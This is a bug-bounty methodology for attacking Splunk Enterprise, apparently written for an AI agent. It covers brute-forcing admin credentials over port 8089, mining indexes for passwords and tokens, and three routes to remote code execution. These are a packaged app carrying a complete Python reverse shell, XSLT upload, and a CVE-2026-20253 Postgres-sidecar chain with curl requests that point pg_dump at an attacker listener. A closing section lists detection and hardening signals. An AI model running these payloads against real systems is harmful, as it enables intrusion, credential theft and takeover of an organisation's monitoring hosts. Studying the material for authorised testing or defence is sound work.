---
technology: "Splunk Enterprise"
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: monitoring
version: "1.0"
provenance: "upstream-only; zero corpus evidence by design (owner-approved bucket-2 new-unit wave 2026-11-13) — scripted-input and XSLT semantics verified against Splunk documentation/advisories (SVD-2023-1104, SVD-2026-0603; libpq behavior against postgresql.org docs) + rewritten from HackTricks (src/network-services-pentesting/8089-splunkd.md), CC BY-NC 4.0, accessed 2026-11-13"
---

# Splunk bug-bounty methodology

Companion overview: [[splunk]].

Scope: management-port enumeration on 8089 (Splunk Web on 8000), credential takeover, index mining through SPL, and every authenticated-to-RCE path — malicious application with a scripted input, XSLT upload, and the CVE-2026-20253 Postgres-sidecar chain. Siblings: [[monitoring]], [[kibana]].

## Phase 0 — Tooling

A plain `curl` (Basic auth against 8089), a browser for the Splunk Web UI, and any HTTP-Basic brute-force tool. For the sidecar chain: a controllable PostgreSQL listener (any version) and a local `pg_dump`/`pg_restore` pair for reference. Chart payloads need nothing beyond `tar` — an app is a directory tree.

## Phase 1 — Enumeration

Port pair and service identity:

```bash
nmap -sV -p 8000,8089 198.51.100.10
# 8000/tcp https — Splunk Web (login form)
# 8089/tcp https — splunkd management (REST, Basic auth)
```

Anonymous recon: the REST root enumerates which resources the instance exposes before authentication, and Splunk Web discloses the version in its footer/about pages:

```bash
curl -k https://198.51.100.10:8089/services
curl -ks https://198.51.100.10:8000/en-US/account/login | grep -i version
```

Authentication posture questions, in order: (1) does the login page exist at all (free-license-era deployments could run with authentication disabled — the product documentation of the running release decides, not assumptions); (2) is the admin password a historical default (`admin:changeme`) or an obvious weak value; (3) which users/roles exist once authenticated (`GET /services/authentication/users`).

## Phase 2 — Credential takeover on 8089

Brute/spray over Basic auth (8089 sidesteps the web form and its CSRF token):

```bash
# any Basic-auth capable tool; 8089 takes Basic auth, path /services/
hydra -l admin -P rockyou.txt 198.51.100.10 -s 8089 https-get /services/
```

With any admin credential, all three surfaces open at once — enumerate before pivoting to RCE:

- **Queries (index mining)**: submit SPL asynchronously and poll — the index holds the org's secrets in log form.

```bash
curl -ks -u admin:'PASSWORD' https://198.51.100.10:8089/services/search/jobs \
  -d 'search=search * earliest=-30d | stats count by source'
```

High-yield hunts: Windows security events (4624/4720 logons and account creation), password-reset confirmations, proxy logs with `Authorization:` headers, VPN/portail logs, application exceptions leaking stack traces and tokens, and any index of email or chat.

- **User/role enumeration**: `GET /services/authentication/users` (credential reuse candidates — Splunk users are often named after domain accounts).
- **Configuration**: `GET /services/properties` and `GET /services/apps/local` (installed apps, their inputs, and the deployment topology).

## Phase 3 — RCE with an admin credential

### Path A — malicious application (scripted input)

The universal path: package an app whose `inputs.conf` schedules a script; install it through Splunk Web (Apps → Manage Apps → Install app from file) or the REST API (`POST /services/apps/local` with the package); execution starts on the next input interval, as the Splunk service account.

```
splunk_shell/
├── bin/rev.py          # or run.ps1 / rev.sh / rev.bat
└── default/inputs.conf
```

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = mysourcetype
```

Linux payload (bundled Python, plain stdlib):

```python
import socket, subprocess, os
s = socket.socket(); s.connect(("198.51.100.10", 443))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

Windows payload (`bin/run.ps1`, same wiring): a stock PowerShell TCP-client loop reading commands from the socket, invoking them, and writing output back — the classic Nishang-style one-liner shape with `ATTACKER_IP` and port 443 substituted. Interpretation is per-host: shell, batch, PowerShell, and the release's Python runtime are all valid `script://` targets; pick by platform. Remember deployment reach: on an estate with a deployment server, the same app pushed to forwarders runs as the forwarder service account — frequently `SYSTEM` on Windows.

### Path B — XSLT upload (CVE-2023-46214)

Affects Splunk Enterprise 9.0.0–9.0.6 and 9.1.0–9.1.1 (Splunk Web component; fixed 9.0.7 / 9.1.2). The product did not safely sanitize user-supplied XSLT: an authenticated user who can get a stylesheet processed — the lookup-file editing workflow in Splunk Web is the documented route, search-job XSLT the other — uploads an XSLT whose extension functions execute code on the instance. Verify the version first; on a patched target this path is dead. The hardening signal to report: `enableSearchJobXslt = false` in `web.conf [settings]` disables the search-job XSLT surface on instances that cannot upgrade.

### Path C — CVE-2026-20253: Postgres sidecar file write → code execution

Gates (verified against SVD-2026-0603): Splunk Enterprise **10.2 below 10.2.4** and **10 below 10.0.7**; 9.4 and earlier unaffected; fixed in 10.0.7 / 10.2.4 / 10.4.0. The sidecar binds loopback, but Splunk Web proxies it at `/en-US/splunkd/__raw/v1/postgres/`, and the recovery handlers enforce no application authentication — an arbitrary Basic-auth username is forwarded to the PostgreSQL client programs.

Non-destructive reachability check (an empty POST): `400` with a decode error means the request reached the handler; `401` means the proxy blocked it; anything else — the sidecar may be absent or disabled.

```bash
curl -kis -X POST 'https://198.51.100.10:8000/en-US/splunkd/__raw/v1/postgres/recovery/backup' \
  -H 'Authorization: Basic YW55OnRoaW5n'
```

The backup handler effectively runs `pg_dump -h localhost -p <port> -w -U <basic-user> -f <backupFile> -Fc <database>`, and two fields cross trust boundaries:

- `backupFile` reaches `-f` unconstrained — absolute paths or `../` traversal create/truncate any file writable by the Splunk OS account (this is the advisory's own primitive: unauthenticated arbitrary file creation and truncation).
- `database` is the final connection argument, and `pg_dump` accepts a libpq **connection string** there, overriding the fixed `-h localhost` — `hostaddr=198.51.100.10 dbname=lab` redirects the dump at your PostgreSQL listener.

```bash
curl -ks 'https://198.51.100.10:8000/en-US/splunkd/__raw/v1/postgres/recovery/backup' \
  -H 'Authorization: Basic YW55OnRoaW5n' -H 'Content-Type: application/json' \
  --data '{"database":"hostaddr=198.51.100.10 dbname=lab","backupFile":"/tmp/lab.dump"}'
```

Escalation to execution (research chain, authorized environments only): run `pg_restore` through the sibling `recovery/restore` handler with an injected `passfile=` connection string pointing at the service's own `.pgpass`, so the restore authenticates locally without ever disclosing that password. Feed it a custom-format archive you authored on your PostgreSQL listener containing a `SECURITY DEFINER` function that turns bytes into a large object and calls `lo_export`, plus a `CHECK` constraint that invokes it during row restore — restore becomes a controlled file write by the service process. Write over a Python module or scripted input Splunk later executes; the chain lands as the `splunk` account, not root. Preconditions to verify before claiming: outbound reach from target to your listener, sufficient DB privileges, a usable passfile entry, and a writable execution target.

## Phase 4 — Host-side evidence (filesystem access)

On a host with `$SPLUNK_HOME` readable, record before touching content:

- `etc/auth/splunk.secret` — the instance key for configuration credentials (backups may hold older distinct values);
- `etc/system/local/authentication.conf` — may carry an LDAP `bindDNpassword` (encrypted; needs the key above);
- app `default/inputs.conf` / `local/inputs.conf` + `bin/` — every `script://` stanza is a scheduled execution with provenance. Do not assume a recovered app password doubles as a Windows account password — they are separate stores.

## Phase 5 — Detection and hardening signals to report

- 8089 exposed beyond management ranges; Basic-auth brute patterns against `/services/`.
- App installs outside change windows (`POST /services/apps/local`, "Install app from file" events), new `script://` stanzas, scripts in app `bin/` matching shell/Python reverse-shell shapes.
- For 10.x: sidecar enabled + Splunk Web reachable = CVE-2026-20253 exposure; remediation is 10.0.7/10.2.4/10.4.0 or disabling the sidecar; watch for outbound PostgreSQL connections from the Splunk host and unexpected `pg_dump`/`pg_restore` file writes.
- XSLT: patched release or `enableSearchJobXslt = false`; alert on stylesheet uploads.
- Credential hygiene: no shared admin across tiers, MFA on Splunk Web where supported, forwarder service accounts documented so app-push reach is known.
